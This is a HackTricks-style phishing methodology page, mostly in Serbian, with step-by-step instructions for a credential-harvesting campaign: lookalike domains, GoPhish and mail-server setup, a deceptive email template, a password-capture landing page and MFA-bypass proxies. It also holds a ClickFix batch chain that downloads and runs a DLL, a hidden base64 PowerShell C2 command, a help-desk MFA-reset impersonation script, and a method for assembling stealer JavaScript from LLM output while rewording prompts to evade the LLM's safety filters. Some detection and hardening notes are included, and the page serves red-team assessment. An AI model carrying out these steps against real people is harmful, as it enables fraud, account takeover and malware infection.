# Phishing Metodologija

{{#include ../../banners/hacktricks-training.md}}

## Metodologija

1. Recon metu
1. Izaberi **victim domain**.
2. Uradi osnovnu web enumeraciju **tražeći login portale** koje koristi meta i **odluči** koji ćeš **imitirati**.
3. Koristi neku **OSINT** za **pronalaženje emailova**.
2. Pripremi okruženje
1. **Kupi domen** koji ćeš koristiti za phishing procenu
2. **Konfiguriši email servise** (SPF, DMARC, DKIM, rDNS)
3. Konfiguriši VPS sa **gophish**
3. Pripremi kampanju
1. Pripremi **email template**
2. Pripremi **web stranicu** za krađu kredencijala
4. Pokreni kampanju!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Ime domena **sadrži** važan **keyword** originalnog domena (npr. zelster.com-management.com).
- **hypened subdomain**: Zameni **tačku crticom** u poddomeni (npr. www-zelster.com).
- **New TLD**: Isti domen koristeći **novi TLD** (npr. zelster.org)
- **Homoglyph**: **Zameni** slovo u imenu domena sa **slovima sličnog izgleda** (npr. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zameni mesta** dvama slovima unutar imena domena (npr. zelsetr.com).
- **Singularization/Pluralization**: Dodaje ili uklanja “s” na kraju imena domena (npr. zeltsers.com).
- **Omission**: **Ukloni jedno** slovo iz imena domena (npr. zelser.com).
- **Repetition:** **Ponavlja jedno** od slova u imenu domena (npr. zeltsser.com).
- **Replacement**: Kao homoglyph, ali manje prikriveno. Zamenjuje jedno od slova u imenu domena, možda slovom u blizini originalnog na tastaturi (npr. zektser.com).
- **Subdomained**: Uvedi **tačku** unutar imena domena (npr. ze.lster.com).
- **Insertion**: **Umetni slovo** u ime domena (npr. zerltser.com).
- **Missing dot**: Pridodaj TLD direktno imenu domena. (npr. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se neki bitovi** u skladištenju ili komunikaciji automatski promene zbog faktora kao što su solarne oluje, kosmičke zrake ili hardverske greške.

Kada se ovaj koncept **primeni na DNS zahteve**, moguće je da **domen koji DNS server primi** nije isti kao domen koji je prvobitno zatražen.

Na primer, promena jednog bita u domenu "windows.com" može ga promeniti u "windnws.com."

Napadači mogu **iskoristiti ovo registrujući više bit-flipping domena** sličnih domenu mete. Njihova namera je da preusmere legitimne korisnike na svoju infrastrukturu.

Za više informacija pročitaj [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Možeš pretražiti na [https://www.expireddomains.net/](https://www.expireddomains.net) za istekao domen koji bi mogao da iskoristiš.\
Da bi bio siguran da domen koji kupuješ već ima dobar SEO, možeš proveriti kako je kategorizovan na:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da bi **otkrio više** validnih email adresa ili **verifikovao one** koje si već pronašao, možeš pokušati brute-force nad SMTP serverima mete. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravi da ako korisnici koriste **bilo koji web portal** za pristup svojim mejlovima, možeš proveriti da li je ranjiv na **username brute force**, i iskoristiti ranjivost ako je moguće.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora da bude **usmeren** na **IP VPS-a** gde konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracija maila**

Instalirajte: `apt-get install postfix`

Zatim dodajte domen u sledeće fajlove:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Takođe izmenite vrednosti sledećih promenljivih u /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na kraju izmenite fajlove **`/etc/hostname`** i **`/etc/mailname`** na vaše ime domena i **restartujte vaš VPS.**

Sada kreirajte **DNS A record** `mail.<domain>` koji pokazuje na **IP adresu** VPS-a i **DNS MX** zapis koji pokazuje na `mail.<domain>`

Sada testirajte slanje email-a:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracija Gophish-a**

Zaustavite izvršavanje gophish-a i konfigurišimo ga.\
Izmenite `/opt/gophish/config.json` na sledeće (pazite na upotrebu https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigurišite gophish servis**

Da biste kreirali gophish servis tako da može biti automatski pokrenut i upravljan kao servis, možete kreirati datoteku `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfiguraciju servisa i proverite ga tako što ćete:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekajte i budite legitimni

Što je domen stariji, manje je verovatno da će biti označen kao spam. Zato bi trebalo da sačekate što duže (najmanje 1 nedelju) pre phishing assessment. Štaviše, ako postavite stranicu vezanu za reputacioni sektor, reputacija koju dobijete biće bolja.

Imajte na umu da, iako treba da sačekate nedelju dana, sve možete podesiti odmah.

### Konfigurišite Reverse DNS (rDNS) zapis

Postavite rDNS (PTR) zapis koji preslikava IP adresu VPS-a na ime domena.

### Sender Policy Framework (SPF) zapis

Morate **podesiti SPF zapis za novi domen**. Ako ne znate šta je SPF zapis [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možete koristiti [https://www.spfwizard.net/](https://www.spfwizard.net) da generišete vašu SPF politiku (koristite IP VPS mašine)

![](<../../images/image (1037).png>)

Ovo je sadržaj koji mora biti postavljen u TXT zapisu domena:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) zapis

Morate **konfigurisati DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>` sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Morate da **konfigurišete DKIM za novi domen**. Ako ne znate šta je DMARC zapis [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Potrebno je da konkatenirate obe B64 vrednosti koje DKIM ključ generiše:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

To možete uraditi koristeći [https://www.mail-tester.com/](https://www.mail-tester.com/)\
Samo pristupite stranici i pošaljite e-poruku na adresu koju vam daju:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Možete takođe **proveriti konfiguraciju e-pošte** slanjem e-poruke na `check-auth@verifier.port25.com` i **pročitati odgovor** (za ovo ćete morati da **otvorite** port **25** i vidite odgovor u fajlu _/var/mail/root_ ako pošaljete e-poruku kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Takođe možete poslati **poruku na Gmail nalog pod vašom kontrolom**, i proveriti **zaglavlja e-pošte** u inboxu vašeg Gmail naloga, `dkim=pass` bi trebalo da bude prisutan u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Uklanjanje sa Spamhouse Blacklist

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da ti pokaže da li je tvoj domen blokiran od strane spamhouse. Možeš zatražiti uklanjanje svog domena/IP-a na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft Blacklist

Možeš zatražiti uklanjanje svog domena/IP-a na [https://sender.office.com/](https://sender.office.com).

## Kreiraj i pokreni GoPhish kampanju

### Profil pošiljaoca

- Odredi neko **ime za identifikaciju** profila pošiljaoca
- Odluči sa kog naloga ćeš slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Možeš ostaviti prazno korisničko ime i lozinku, ali obavezno označi Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se korišćenje funkcije "**Send Test Email**" da proveriš da li sve radi.\
> Preporučio bih da **pošalješ test emailove na 10min mails adrese** kako bi izbegao da budeš stavljen na crnu listu tokom testiranja.

### Email šablon

- Postavi neko **ime za identifikaciju** šablona
- Zatim napiši **predmet** (ništa čudno, samo nešto što bi očekivao da pročitaš u običnom emailu)
- Uveri se da si označio "**Add Tracking Image**"
- Napiši **email šablon** (možeš koristiti varijable kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Imajte na umu da **da biste povećali kredibilitet mejla**, preporučuje se korišćenje nekog potpisa iz mejla klijenta. Predlozi:

- Pošaljite mejl na **nepostojeću adresu** i proverite da li odgovor sadrži neki potpis.
- Potražite **javne mejlove** kao što su info@ex.com ili press@ex.com ili public@ex.com i pošaljite im mejl i sačekajte odgovor.
- Pokušajte da kontaktirate **neki validan otkriven** mejl i sačekajte odgovor

![](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe dozvoljava **prilaženje fajlova za slanje**. Ako želite i da ukradete NTLM challenges koristeći neke specijalno kreirane fajlove/dokumente [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Unesite **ime**
- **Napišite HTML kod** web stranice. Imajte na umu da možete **importovati** web stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Postavite **redirekciju**

![](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da modifikujete HTML kod stranice i napravite nekoliko testova lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatima.** Zatim taj HTML kod unesite u polje.\
> Imajte u vidu da ako vam trebaju **staticki resursi** za HTML (možda neki CSS i JS fajlovi) možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i potom im pristupiti preko _**/static/\<filename>**_

> [!TIP]
> Za redirekciju možete **preusmeriti korisnike na legitimnu glavnu veb-stranicu** žrtve, ili ih preusmeriti na _/static/migration.html_ na primer, stavite neku **spinning wheel (**[**https://loading.io/**](https://loading.io)**) na 5 sekundi i onda naznačite da je proces uspešan**.

### Users & Groups

- Postavite ime
- **Importujte podatke** (imajte na umu da da biste koristili template za primer trebate firstname, last name i email address svakog korisnika)

![](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte kampanju birajući ime, email template, landing page, URL, sending profile i grupu. Imajte u vidu da će URL biti link poslat žrtvama

Imajte na umu da **Sending Profile omogućava slanje test mejla da vidite kako će konačni phishing mejl izgledati**:

![](<../../images/image (192).png>)

> [!TIP]
> Preporučio bih da **test mejlove šaljete na 10min mail adrese** kako biste izbegli da vas blacklistuju tokom testiranja.

Kada je sve spremno, samo pokrenite kampanju!

## Website Cloning

Ako iz nekog razloga želite da klonirate veb-sajt, proverite sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing procenama (uglavnom za Red Teams) možda ćete želeti i da **pošaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili nešto što će samo pokrenuti autentifikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično pametan jer falsifikujete pravu veb-stranicu i prikupljate informacije koje korisnik unese. Nažalost, ako korisnik nije uneo tačnu lozinku ili ako aplikacija koju ste falsifikovali koristi 2FA, **ove informacije vam neće omogućiti da se lažno predstavite kao prevaren korisnik**.

Tu dolaze alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovi alati omogućavaju generisanje MitM-like napada. U suštini, napad funkcioniše na sledeći način:

1. Vi **imitirate login** formu prave veb-stranice.
2. Korisnik **pošalje** svoje **credentials** na vašu lažnu stranicu, a alat ih prosleđuje pravoj stranici, **proveravajući da li kredencijali rade**.
3. Ako je nalog podešen sa **2FA**, MitM stranica će tražiti 2FA i kad ga **korisnik unese**, alat će ga proslediti pravoj veb-stranici.
4. Kada je korisnik autentifikovan, vi (kao napadač) ćete imati **uhvaćene credentials, 2FA, cookie i sve informacije** o svakoj interakciji dok alat izvodi MitM.

### Via VNC

Šta ako umesto da **preusmerite žrtvu na malicioznu stranicu** koja izgleda kao original, pošaljete je na **VNC sesiju sa browser-om povezanom na pravu veb-stranicu**? Moći ćete da vidite šta radi, ukradete lozinku, MFA koji je korišćen, cookies...\
Ovo možete izvesti sa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Otkrivanje da li ste otkriveni

Očigledno je jedan od najboljih načina da znate da li ste otkriveni da **pretražite svoj domen u crnim listama**. Ako se pojavi na listi, vaš domen je na neki način detektovan kao sumnjiv.\
Jedan lak način da proverite da li se vaš domen pojavljuje na nekoj crnoj listi je korišćenje [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da saznate da li žrtva **aktivno traži sumnjive phishing aktivnosti u prirodi** kao što je objašnjeno u:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen vrlo sličnog imena** žrtvinom domenu **i/ili generisati sertifikat** za **subdomain** domena koji kontrolišete koji **sadrži** **ključnu reč** žrtvinog domena. Ako **žrtva** izvrši bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i treba da budete veoma stealth.

### Evaluate the phishing

Koristite [**Phishious** ](https://github.com/Rices/Phishious) da procenite da li će vaš mejl završiti u folderu za spam, da li će biti blokiran ili uspešan.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion grupe sve češće potpuno preskaču email mamce i **direktno ciljaju service-desk / identity-recovery workflow** da bi zaobišle MFA. Napad je skroz "living-off-the-land": jednom kada operater poseduje validne kredencijale oni pivotiraju koristeći ugrađene admin alate – malware nije potreban.

### Attack flow
1. Rekon po žrtvi
* Prikupite lične i korporativne podatke sa LinkedIn, data breaches, javnog GitHub-a, itd.
* Identifikujte visokovredne identitete (izvršni, IT, finance) i enumerišite **tačan help-desk proces** za reset lozinke / MFA.
2. Real-time social engineering
* Telefon, Teams ili chat sa help-deskom dok se predstavljate kao cilj (često sa **spoofed caller-ID** ili **cloned voice**).
* Pružite ranije prikupljene PII da biste prošli verifikaciju zasnovanu na znanju.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** na registrovani mobilni broj.
3. Odmah posle pristupa (≤60 min u realnim slučajevima)
* Uspostavite pristup kroz bilo koji web SSO portal.
* Enumerišite AD / AzureAD koristeći ugrađene alate (bez drop-ovanja binarnih fajlova):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateralno kretanje koristeći **WMI**, **PsExec**, ili legitimne **RMM** agente koji su već belisted u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privilegovanu operaciju** – zahtevajte step-up auth i odobrenje menadžera.
* Implementirajte **Identity Threat Detection & Response (ITDR)** / **UEBA** pravila koja alarmiraju na:
* Promenu MFA metode + autentifikacija sa novog uređaja / geo lokacije.
* Trenutno podizanje privilegija istog principala (user → admin).
* Snimajte help-desk pozive i primenite **call-back na već registrovani broj** pre bilo kakvog reseta.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** tako da novopodešeni nalozi **ne dobijaju automatski** visokoprivilegovane tokene.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity ekipe nadoknađuju troškove high-touch operacija masovnim napadima koji pretvaraju **search engines & ad networks u kanal isporuke**.

1. **SEO poisoning / malvertising** guraju lažni rezultat kao što je `chromium-update[.]site` na vrh search reklama.
2. Žrtva preuzme mali **first-stage loader** (često JS/HTA/ISO). Primeri viđeni od strane Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader izbacuje browser cookies + credential DBs, zatim povlači **silent loader** koji odlučuje – *u realnom vremenu* – da li da deploy-uje:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novo-registrovane domene i primenjujte **Advanced DNS / URL Filtering** na *search-ads* kao i na e-mail.
* Ograničite instalaciju softvera na signed MSI / Store pakete, zabranite izvršavanje `HTA`, `ISO`, `VBS` politikom.
* Monitorišite child procese browser-a koji otvaraju instalere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Potražite LOLBins koje često zloupotrebljavaju first-stage loaderi (npr. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Mamac: klonovani nacionalni CERT advisory sa **Update** dugmetom koje prikazuje korak-po-korak instrukcije za “fix”. Žrtvama se kaže da pokrenu batch koji preuzme DLL i izvrši ga preko `rundll32`.
* Tipični batch chain zabeležen:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` ispušta payload u `%TEMP%`, kratak sleep skriva mrežni jitter, zatim `rundll32` poziva eksportovanu entrypoint (`notepad`).
* DLL beacon-uje identitet hosta i pali polling ka C2 na par minuta. Udaljena taskovanja stižu kao **base64-encoded PowerShell** izvršen skriveno i sa policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo održava fleksibilnost C2 (server može menjati taskove bez update-a DLL-a) i skriva konzolne prozore. Hunt-ujte za PowerShell child procesima `rundll32.exe` koji koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zajedno.
* Defenders mogu tražiti HTTP(S) callbacks oblika `...page.php?tynor=<COMPUTER>sss<USER>` i 5-minutne polling intervale posle učitavanja DLL-a.

---

## AI-Enhanced Phishing Operations
Napadači sada lančaju **LLM & voice-clone APIs** za potpuno personalizovane mamce i real-time interakciju.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Dodajte **dinamične bannere** koji ističu poruke poslate iz nepouzdanih automatizacija (preko ARC/DKIM anomalija).  
• Implementirajte **voice-biometric challenge phrases** za visokorizične telefonske zahteve.  
• Kontinuirano simulirajte AI-generisane mamce u programima svesti – statični template-ovi su zastareli.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu isporučiti benigno-postojeći HTML i **generisati stealer u runtime-u** tražeći od **pouzdanog LLM API-ja** JavaScript, a zatim ga izvršiti u browser-u (npr. `eval` ili dinamički `<script>`).

1. **Prompt-as-obfuscation:** enkodirajte exfil URLs/Base64 stringove u prompt; iterativno menjajte wording da biste izbegli sigurnosne filtere i smanjili halucinacije.
2. **Client-side API call:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u statičkom HTML-u je prisutan samo prompt/API poziv.
3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polimorfno po poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generisani kod personalizuje mamac (npr., LogoKit token parsing) i šalje creds na prompt-hidden endpoint.

**Evasion traits**
- Saobraćaj cilja dobro poznate LLM domene ili ugledne CDN proxy-je; ponekad putem WebSockets do backend-a.
- Nema statičkog payload-a; zlonamerni JS postoji samo nakon renderovanja.
- Nedeterminističke generacije proizvode **jedinstvene** stealers po sesiji.

**Detection ideas**
- Pokrenite sandboxes sa JS omogućenim; označite **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Tražite front-end POSTs ka LLM APIs koji su odmah praćeni `eval`/`Function` na vraćenom tekstu.
- Alarmirajte na nesankcionisane LLM domene u klijentskom saobraćaju i naknadne credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Pored klasičnog push-bombing, operatori jednostavno **prisile novu MFA registraciju** tokom help-desk poziva, poništavajući postojeći token korisnika. Bilo koji naredni login prompt izgleda legitiman za žrtvu.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.



## Clipboard Hijacking / Pastejacking

Napadači mogu tiho kopirati maliciozne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice i zatim navesti korisnika da ih nalepi u **Win + R**, **Win + X** ili u terminal window, izvršavajući proizvoljan kod bez ikakvog preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* APK ugrađuje statičke kredencijale i po-profilne “unlock codes” (no server auth). Žrtve prate lažni tok ekskluzivnosti (login → locked profiles → unlock) i, na tačne kodove, bivaju preusmerene u WhatsApp chatove sa attacker-controlled `+92` brojevima dok spyware radi tiho.
* Prikupljanje počinje čak i pre login-a: immediate exfil of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). Content observer automatski uploaduje nove fotografije; scheduled job re-scans for new documents every **5 minutes**.
* Persistence: registruje se za `BOOT_COMPLETED` i održava **foreground service** aktivnim da preživi reboote i background evictions.

### WhatsApp device-linking hijack via QR social engineering
* Lure page (npr. fake ministry/CERT “channel”) prikazuje WhatsApp Web/Desktop QR i uputi žrtvu da ga skenira, tiho dodajući napadača kao **linked device**.
* Napadač odmah dobija vidljivost chatova/kontakata dok session nije uklonjen. Žrtve mogu kasnije videti “new device linked” notifikaciju; defenders mogu hunt for unexpected device-link events shortly after visits to untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operatori sve češće stavljaju svoje phishing tokove iza jednostavne provere uređaja tako da desktop crawlers nikada ne dođu do krajnjih stranica. Uobičajen obrazac je mali skript koji testira touch-capable DOM i posts the result na server endpoint; non‑mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok mobile korisnici dobijaju ceo flow.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Često uočeno ponašanje servera:
- Postavlja session cookie pri prvom učitavanju.
- Accepts `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) na naredne GETs kada je `is_mobile=false`; servira phishing samo ako je `true`.

Hunting i heuristike detekcije:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetrija: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non‑mobile; legitimne mobilne putanje žrtava vraćaju 200 sa pratećim HTML/JS.
- Blokirajte ili detaljno proverite stranice koje uslovljavaju sadržaj isključivo na `ontouchstart` ili slične provere uređaja.

Saveti za odbranu:
- Pokrenite crawlers sa mobilnim otiscima i uključenim JS-om kako biste otkrili sadržaj iza ograničenja.
- Podesite upozorenja na sumnjive odgovore 500 koji slede nakon `POST /detect` na novo registrovanim domenima.

## Reference

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
